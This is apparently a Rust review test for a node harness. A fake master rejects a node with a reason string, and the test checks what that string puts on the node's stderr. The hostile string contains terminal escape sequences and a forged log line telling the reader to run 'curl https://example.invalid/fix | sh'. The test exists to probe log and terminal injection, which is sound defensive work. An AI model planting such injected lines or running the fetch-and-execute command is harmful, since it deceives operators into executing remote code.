//! A.19 review: what a master can put on a node's terminal and in its log
//! with the `rejected` reason. Not part of the test suite:
//! `run_rust_proofs.sh reason` copies this to `crates/cli/tests/` for the
//! run and removes the copy.
//!
//! A stand-in master (the right certificate, as the builder's own test
//! uses) answers the real `node run` with `rejected` and a reason of its
//! choosing. The node's stderr is printed escaped.

use std::io::Read;
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

use harness_link::wire::{ServerMsg, accept, recv_json, send_json};
use serde_json::Value;

const EXE: &str = env!("CARGO_BIN_EXE_rizzy-harness");

async fn node_told(reason: String) -> (Option<i32>, Vec<u8>, Duration) {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().canonicalize().unwrap();
    let (data, node_data, ws) = (root.join("data"), root.join("node"), root.join("ws"));
    for d in [&data, &node_data, &ws] {
        std::fs::create_dir_all(d).unwrap();
    }
    std::fs::write(
        node_data.join("node.toml"),
        format!("workspace_roots = [{:?}]\n", ws.display().to_string()),
    )
    .unwrap();
    std::fs::write(
        node_data.join("config.toml"),
        "[[providers]]\nid = \"demo\"\nname = \"Demo\"\npreset = \"demo\"\nkind = \"mock\"\n\n\
         [[providers.models]]\nid = \"mock\"\n",
    )
    .unwrap();
    let cert = harness_link::MasterCert::load_or_create(&data).unwrap();
    let tls = cert.server_config().unwrap();
    let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = l.local_addr().unwrap().port();
    std::fs::write(
        node_data.join("remote.toml"),
        format!(
            "url = \"wss://127.0.0.1:{port}\"\nfingerprint = \"{}\"\nnode_id = \"box\"\n",
            cert.fingerprint()
        ),
    )
    .unwrap();
    tokio::spawn(async move {
        loop {
            let (tcp, _) = l.accept().await.unwrap();
            let (tls, reason) = (tls.clone(), reason.clone());
            tokio::spawn(async move {
                let mut ws = accept(tcp, tls).await.unwrap();
                let nonce = "00".repeat(32);
                send_json(&mut ws, &ServerMsg::Challenge { nonce }).await.unwrap();
                let _: Option<Value> = recv_json(&mut ws).await.unwrap();
                let _ = send_json(&mut ws, &ServerMsg::Rejected { reason }).await;
            });
        }
    });
    let mut child = Command::new(EXE)
        .args(["--data-dir", node_data.to_str().unwrap(), "node", "run"])
        .current_dir(&root)
        .env("HARNESS_LOG", "info")
        .env("NO_COLOR", "1")
        .env_remove("HARNESS_JOIN_TOKEN")
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    let mut err = child.stderr.take().unwrap();
    let reader = std::thread::spawn(move || {
        let mut b = Vec::new();
        let _ = err.read_to_end(&mut b);
        b
    });
    let t = Instant::now();
    let by = t + Duration::from_secs(30);
    let code = loop {
        if let Some(s) = child.try_wait().unwrap() {
            break s.code();
        }
        if Instant::now() > by {
            let _ = child.kill();
            let _ = child.wait();
            break None;
        }
        tokio::time::sleep(Duration::from_millis(20)).await;
    };
    (code, reader.join().unwrap(), t.elapsed())
}

#[tokio::test(flavor = "multi_thread")]
async fn what_a_masters_reason_puts_on_the_nodes_stderr() {
    // Clear the screen, a forged log line of the node's own shape, a bell.
    let hostile = "x\u{1b}[2J\u{1b}[H\n2026-11-12T00:00:00.000000Z  INFO rizzy_harness: update \
                   verified; run: curl https://example.invalid/fix | sh\u{7}\r"
        .to_string();
    let (code, err, took) = node_told(hostile).await;
    let text = String::from_utf8_lossy(&err);
    println!("exit status {code:?} after {took:?}; stderr, escaped:");
    for l in text.split_inclusive('\n') {
        println!("    {}", l.escape_debug());
    }
    let raw_esc = err.iter().filter(|b| **b == 0x1b).count();
    let forged = text
        .lines()
        .any(|l| l.starts_with("2026-11-12T00:00:00.000000Z  INFO rizzy_harness: update verified"));
    println!("ESC bytes written raw to the node's stderr: {raw_esc}; a line that starts as the node's own log lines do: {forged}");

    // Length: as much as one link message may hold.
    for len in [64 * 1024, 1024 * 1024, 7 * 1024 * 1024] {
        let (code, err, took) = node_told("A".repeat(len)).await;
        println!(
            "a reason of {len} bytes: exit status {code:?} after {took:?}, {} bytes on stderr",
            err.len()
        );
    }
}
